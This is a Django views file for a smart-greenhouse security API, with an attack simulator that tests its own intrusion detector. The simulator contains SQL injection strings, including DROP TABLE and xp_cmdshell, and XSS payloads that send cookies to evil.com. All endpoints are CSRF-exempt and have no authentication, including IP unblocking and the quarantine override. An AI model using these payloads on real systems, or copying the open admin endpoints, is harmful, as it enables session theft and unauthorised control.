# =============================================================================
# SmartGrow SecureAI - Security Views (API Endpoints)
# =============================================================================
# REST API для системи безпеки
# =============================================================================

import json
import logging
from datetime import datetime, timedelta
from django.http import JsonResponse
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

from .ids import ids, AttackType, ThreatLevel
from .crypto import secure_random, password_hasher, HMACSignature

logger = logging.getLogger('smartgrow.security.views')


@method_decorator(csrf_exempt, name='dispatch')
class SecurityStatusView(View):
    """
    GET /api/security/status
    
    Повертає поточний статус системи безпеки:
    - Trust Score
    - Режим карантину
    - Статистика загроз
    - Заблоковані IP
    """
    
    def get(self, request):
        """Отримати статус системи безпеки"""
        status = ids.get_status()
        
        # Додаємо детальну статистику
        recent_events = ids.security_events[-100:]
        
        # Групуємо події по годинах
        hourly_stats = {}
        for event in recent_events:
            hour = event.timestamp.strftime('%Y-%m-%d %H:00')
            if hour not in hourly_stats:
                hourly_stats[hour] = {'total': 0, 'blocked': 0}
            hourly_stats[hour]['total'] += 1
            if event.blocked:
                hourly_stats[hour]['blocked'] += 1
        
        return JsonResponse({
            'success': True,
            'data': {
                'trust_score': status['trust_score'],
                'quarantine_mode': status['quarantine_mode'],
                'threat_level': status['threat_level'],
                'blocked_ips_count': len(status['blocked_ips']),
                'recent_events_count': status['recent_events_count'],
                'threat_counts': status['threat_counts'],
                'hourly_stats': hourly_stats,
                'system_health': self._calculate_health(status),
            }
        })
    
    def _calculate_health(self, status: dict) -> str:
        """Розраховує загальний стан системи"""
        if status['quarantine_mode']:
            return 'CRITICAL'
        if status['trust_score'] >= 90:
            return 'EXCELLENT'
        if status['trust_score'] >= 70:
            return 'GOOD'
        if status['trust_score'] >= 50:
            return 'WARNING'
        return 'DANGER'


@method_decorator(csrf_exempt, name='dispatch')
class SecurityEventsView(View):
    """
    GET /api/security/events
    
    Повертає список подій безпеки з пагінацією та фільтрацією
    """
    
    def get(self, request):
        """Отримати події безпеки"""
        # Параметри пагінації
        page = int(request.GET.get('page', 1))
        limit = min(int(request.GET.get('limit', 50)), 100)
        
        # Фільтри
        attack_type = request.GET.get('attack_type')
        threat_level = request.GET.get('threat_level')
        blocked_only = request.GET.get('blocked_only', '').lower() == 'true'
        
        # Фільтруємо події
        events = ids.security_events.copy()
        events.reverse()  # Найновіші спочатку
        
        if attack_type:
            events = [e for e in events if e.attack_type.value == attack_type]
        
        if threat_level:
            try:
                level = ThreatLevel[threat_level.upper()]
                events = [e for e in events if e.threat_level == level]
            except KeyError:
                pass
        
        if blocked_only:
            events = [e for e in events if e.blocked]
        
        # Пагінація
        total = len(events)
        start = (page - 1) * limit
        end = start + limit
        paginated_events = events[start:end]
        
        # Серіалізація
        serialized = [
            {
                'timestamp': e.timestamp.isoformat(),
                'attack_type': e.attack_type.value,
                'threat_level': e.threat_level.name,
                'source_ip': e.source_ip,
                'target': e.target,
                'blocked': e.blocked,
                'signature_id': e.signature_id,
                'details': e.details,
            }
            for e in paginated_events
        ]
        
        return JsonResponse({
            'success': True,
            'data': {
                'events': serialized,
                'pagination': {
                    'page': page,
                    'limit': limit,
                    'total': total,
                    'pages': (total + limit - 1) // limit,
                }
            }
        })


@method_decorator(csrf_exempt, name='dispatch')
class BlockedIPsView(View):
    """
    GET /api/security/blocked-ips
    POST /api/security/blocked-ips (block IP)
    DELETE /api/security/blocked-ips (unblock IP)
    
    Керування заблокованими IP адресами
    """
    
    def get(self, request):
        """Отримати список заблокованих IP"""
        blocked = ids.rate_limiter.get_blocked_ips()
        
        return JsonResponse({
            'success': True,
            'data': {
                'blocked_ips': blocked,
                'count': len(blocked),
            }
        })
    
    def post(self, request):
        """Заблокувати IP вручну"""
        try:
            data = json.loads(request.body)
            ip = data.get('ip')
            reason = data.get('reason', 'Manual block by admin')
            duration = int(data.get('duration', 3600))  # За замовчуванням 1 година
            
            if not ip:
                return JsonResponse({
                    'success': False,
                    'error': 'IP адреса обов\'язкова'
                }, status=400)
            
            # Блокуємо IP
            ids.rate_limiter.blocked_ips[ip] = datetime.now()
            
            # Логуємо подію
            logger.warning(f"IP {ip} заблоковано вручну: {reason}")
            
            return JsonResponse({
                'success': True,
                'message': f'IP {ip} заблоковано на {duration} секунд',
                'data': {
                    'ip': ip,
                    'reason': reason,
                    'duration': duration,
                }
            })
            
        except json.JSONDecodeError:
            return JsonResponse({
                'success': False,
                'error': 'Невірний JSON формат'
            }, status=400)
    
    def delete(self, request):
        """Розблокувати IP"""
        try:
            data = json.loads(request.body)
            ip = data.get('ip')
            
            if not ip:
                return JsonResponse({
                    'success': False,
                    'error': 'IP адреса обов\'язкова'
                }, status=400)
            
            if ip in ids.rate_limiter.blocked_ips:
                del ids.rate_limiter.blocked_ips[ip]
                logger.info(f"IP {ip} розблоковано вручну")
                
                return JsonResponse({
                    'success': True,
                    'message': f'IP {ip} розблоковано'
                })
            else:
                return JsonResponse({
                    'success': False,
                    'error': f'IP {ip} не заблоковано'
                }, status=404)
                
        except json.JSONDecodeError:
            return JsonResponse({
                'success': False,
                'error': 'Невірний JSON формат'
            }, status=400)


@method_decorator(csrf_exempt, name='dispatch')
class QuarantineView(View):
    """
    GET /api/security/quarantine
    POST /api/security/quarantine (activate/deactivate)
    
    Керування режимом карантину
    """
    
    def get(self, request):
        """Отримати статус карантину"""
        return JsonResponse({
            'success': True,
            'data': {
                'quarantine_mode': ids.quarantine_mode,
                'trust_score': ids.trust_score,
                'can_exit': ids.trust_score >= 70,
                'exit_threshold': 70,
            }
        })
    
    def post(self, request):
        """Активувати/деактивувати карантин"""
        try:
            data = json.loads(request.body)
            action = data.get('action')  # 'activate' або 'deactivate'
            admin_override = data.get('admin_override', False)
            
            if action == 'activate':
                ids.quarantine_mode = True
                logger.warning("Карантин активовано вручну")
                
                return JsonResponse({
                    'success': True,
                    'message': 'Режим карантину активовано',
                    'data': {
                        'quarantine_mode': True,
                        'trust_score': ids.trust_score,
                    }
                })
                
            elif action == 'deactivate':
                if ids.exit_quarantine(admin_override=admin_override):
                    logger.info("Карантин деактивовано")
                    
                    return JsonResponse({
                        'success': True,
                        'message': 'Режим карантину деактивовано',
                        'data': {
                            'quarantine_mode': False,
                            'trust_score': ids.trust_score,
                        }
                    })
                else:
                    return JsonResponse({
                        'success': False,
                        'error': f'Не можна вийти з карантину. Trust Score: {ids.trust_score} (потрібно >= 70)',
                        'data': {
                            'trust_score': ids.trust_score,
                            'required_score': 70,
                        }
                    }, status=403)
            else:
                return JsonResponse({
                    'success': False,
                    'error': 'Невідома дія. Використовуйте "activate" або "deactivate"'
                }, status=400)
                
        except json.JSONDecodeError:
            return JsonResponse({
                'success': False,
                'error': 'Невірний JSON формат'
            }, status=400)


@method_decorator(csrf_exempt, name='dispatch')
class AttackSimulatorView(View):
    """
    POST /api/security/simulate-attack
    
    Симуляція атак для демонстрації системи безпеки
    ТІЛЬКИ ДЛЯ ТЕСТУВАННЯ!
    """
    
    def post(self, request):
        """Симулювати атаку"""
        try:
            data = json.loads(request.body)
            attack_type = data.get('attack_type')
            intensity = data.get('intensity', 'medium')  # low, medium, high
            
            # Мапінг типів атак
            attack_map = {
                'sql_injection': self._simulate_sql_injection,
                'xss': self._simulate_xss,
                'ddos': self._simulate_ddos,
                'sensor_spoofing': self._simulate_sensor_spoofing,
                'data_poisoning': self._simulate_data_poisoning,
                'brute_force': self._simulate_brute_force,
                'replay_attack': self._simulate_replay,
            }
            
            if attack_type not in attack_map:
                return JsonResponse({
                    'success': False,
                    'error': f'Невідомий тип атаки. Доступні: {list(attack_map.keys())}'
                }, status=400)
            
            # Виконуємо симуляцію
            result = attack_map[attack_type](intensity)
            
            return JsonResponse({
                'success': True,
                'message': f'Симуляція {attack_type} завершена',
                'data': {
                    'attack_type': attack_type,
                    'intensity': intensity,
                    'trust_score_before': result['trust_before'],
                    'trust_score_after': ids.trust_score,
                    'events_generated': result['events_count'],
                    'blocked': result['blocked'],
                    'quarantine_triggered': ids.quarantine_mode,
                }
            })
            
        except json.JSONDecodeError:
            return JsonResponse({
                'success': False,
                'error': 'Невірний JSON формат'
            }, status=400)
    
    def _simulate_sql_injection(self, intensity: str) -> dict:
        """Симуляція SQL Injection атаки"""
        trust_before = ids.trust_score
        
        payloads = {
            'low': ["' OR '1'='1"],
            'medium': ["' OR '1'='1", "'; DROP TABLE users; --", "UNION SELECT * FROM users"],
            'high': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "UNION SELECT password FROM users",
                "1; UPDATE users SET role='admin'",
                "'; exec xp_cmdshell('whoami'); --"
            ]
        }
        
        events_count = 0
        blocked = False
        
        for payload in payloads.get(intensity, payloads['medium']):
            allowed, events = ids.analyze_request(
                ip='192.168.1.100',
                path='/api/login',
                method='POST',
                headers={},
                body=f'{{"username": "{payload}", "password": "test"}}'
            )
            events_count += len(events)
            if not allowed:
                blocked = True
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': blocked
        }
    
    def _simulate_xss(self, intensity: str) -> dict:
        """Симуляція XSS атаки"""
        trust_before = ids.trust_score
        
        payloads = {
            'low': ["<script>alert('xss')</script>"],
            'medium': [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')"
            ],
            'high': [
                "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                "<svg/onload=fetch('http://evil.com/'+document.cookie)>",
                "<body onload=eval(atob('YWxlcnQoMSk='))>"
            ]
        }
        
        events_count = 0
        blocked = False
        
        for payload in payloads.get(intensity, payloads['medium']):
            allowed, events = ids.analyze_request(
                ip='192.168.1.101',
                path='/api/comments',
                method='POST',
                headers={},
                body=f'{{"comment": "{payload}"}}'
            )
            events_count += len(events)
            if not allowed:
                blocked = True
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': blocked
        }
    
    def _simulate_ddos(self, intensity: str) -> dict:
        """Симуляція DDoS атаки"""
        trust_before = ids.trust_score
        
        request_counts = {
            'low': 50,
            'medium': 100,
            'high': 200
        }
        
        events_count = 0
        blocked = False
        count = request_counts.get(intensity, 100)
        
        for i in range(count):
            allowed, events = ids.analyze_request(
                ip=f'192.168.1.{200 + (i % 50)}',
                path='/api/data',
                method='GET',
                headers={},
                body=''
            )
            events_count += len(events)
            if not allowed:
                blocked = True
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': blocked
        }
    
    def _simulate_sensor_spoofing(self, intensity: str) -> dict:
        """Симуляція підміни даних сенсорів"""
        trust_before = ids.trust_score
        
        fake_values = {
            'low': [('temperature', 50.0)],  # Занадто гаряче
            'medium': [
                ('temperature', 100.0),
                ('humidity', 150.0),
                ('ph', 20.0)
            ],
            'high': [
                ('temperature', -50.0),
                ('temperature', 200.0),
                ('humidity', -10.0),
                ('humidity', 500.0),
                ('ph', -5.0),
                ('ph', 30.0)
            ]
        }
        
        events_count = 0
        
        for sensor_type, value in fake_values.get(intensity, fake_values['medium']):
            valid, events = ids.analyze_sensor_data(
                sensor_type=sensor_type,
                value=value,
                device_id='fake_device_001'
            )
            events_count += len(events)
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': events_count > 0
        }
    
    def _simulate_data_poisoning(self, intensity: str) -> dict:
        """Симуляція Data Poisoning атаки"""
        trust_before = ids.trust_score
        events_count = 0
        
        # Симулюємо різкі зміни даних
        changes = {
            'low': [(22.0, 25.0)],
            'medium': [(22.0, 30.0), (30.0, 15.0)],
            'high': [(22.0, 35.0), (35.0, 10.0), (10.0, 40.0), (40.0, 5.0)]
        }
        
        for prev, curr in changes.get(intensity, changes['medium']):
            # Додаємо попереднє значення
            ids.anomaly_detector.add_reading('temperature', prev)
            # Різка зміна
            valid, events = ids.analyze_sensor_data(
                sensor_type='temperature',
                value=curr,
                device_id='sensor_001'
            )
            events_count += len(events)
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': events_count > 0
        }
    
    def _simulate_brute_force(self, intensity: str) -> dict:
        """Симуляція Brute Force атаки"""
        trust_before = ids.trust_score
        
        attempts = {
            'low': 10,
            'medium': 30,
            'high': 100
        }
        
        events_count = 0
        blocked = False
        
        for i in range(attempts.get(intensity, 30)):
            ids.rate_limiter.record_failed_attempt('192.168.1.50', 'login')
            allowed, _ = ids.rate_limiter.is_allowed('192.168.1.50')
            if not allowed:
                blocked = True
                events_count += 1
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': blocked
        }
    
    def _simulate_replay(self, intensity: str) -> dict:
        """Симуляція Replay атаки"""
        trust_before = ids.trust_score
        
        # Генеруємо "перехоплений" запит
        nonce = secure_random.nonce()
        timestamp = datetime.now().timestamp()
        
        signer = HMACSignature(b'test-secret-key')
        signature = signer.sign_request(
            method='POST',
            path='/api/water',
            body='{"duration": 10}',
            timestamp=int(timestamp),
            nonce=nonce
        )
        
        events_count = 0
        blocked = False
        
        # Перший запит - легітимний
        ids.replay_detector.validate_request(
            nonce=nonce,
            timestamp=timestamp,
            signature=signature,
            payload='{"duration": 10}',
            secret_key='test-secret-key'
        )
        
        # Повторний запит - replay атака
        replay_attempts = {'low': 1, 'medium': 3, 'high': 10}
        
        for _ in range(replay_attempts.get(intensity, 3)):
            valid, reason = ids.replay_detector.validate_request(
                nonce=nonce,
                timestamp=timestamp,
                signature=signature,
                payload='{"duration": 10}',
                secret_key='test-secret-key'
            )
            if not valid:
                events_count += 1
                blocked = True
        
        return {
            'trust_before': trust_before,
            'events_count': events_count,
            'blocked': blocked
        }


@method_decorator(csrf_exempt, name='dispatch')
class ThreatIntelligenceView(View):
    """
    GET /api/security/threat-intelligence
    
    Отримання аналітики загроз
    """
    
    def get(self, request):
        """Отримати threat intelligence"""
        events = ids.security_events[-500:]
        
        # Аналіз по типах атак
        attack_analysis = {}
        for event in events:
            attack_type = event.attack_type.value
            if attack_type not in attack_analysis:
                attack_analysis[attack_type] = {
                    'count': 0,
                    'blocked': 0,
                    'unique_ips': set(),
                    'last_seen': None,
                }
            
            attack_analysis[attack_type]['count'] += 1
            if event.blocked:
                attack_analysis[attack_type]['blocked'] += 1
            attack_analysis[attack_type]['unique_ips'].add(event.source_ip)
            attack_analysis[attack_type]['last_seen'] = event.timestamp.isoformat()
        
        # Конвертуємо set в count
        for attack_type in attack_analysis:
            attack_analysis[attack_type]['unique_ips'] = len(attack_analysis[attack_type]['unique_ips'])
        
        # Топ атакуючих IP
        ip_counts = {}
        for event in events:
            ip = event.source_ip
            ip_counts[ip] = ip_counts.get(ip, 0) + 1
        
        top_attackers = sorted(
            ip_counts.items(),
            key=lambda x: x[1],
            reverse=True
        )[:10]
        
        # Тренд за останні 24 години
        now = datetime.now()
        hourly_trend = {}
        for hour in range(24):
            hour_start = now - timedelta(hours=hour + 1)
            hour_end = now - timedelta(hours=hour)
            
            hour_events = [
                e for e in events
                if hour_start <= e.timestamp < hour_end
            ]
            
            hourly_trend[hour] = len(hour_events)
        
        return JsonResponse({
            'success': True,
            'data': {
                'attack_analysis': attack_analysis,
                'top_attackers': [
                    {'ip': ip, 'count': count}
                    for ip, count in top_attackers
                ],
                'hourly_trend': hourly_trend,
                'total_events': len(events),
                'blocked_percentage': (
                    len([e for e in events if e.blocked]) / len(events) * 100
                    if events else 0
                ),
                'most_common_attack': max(
                    attack_analysis.items(),
                    key=lambda x: x[1]['count'],
                    default=(None, {'count': 0})
                )[0],
            }
        })
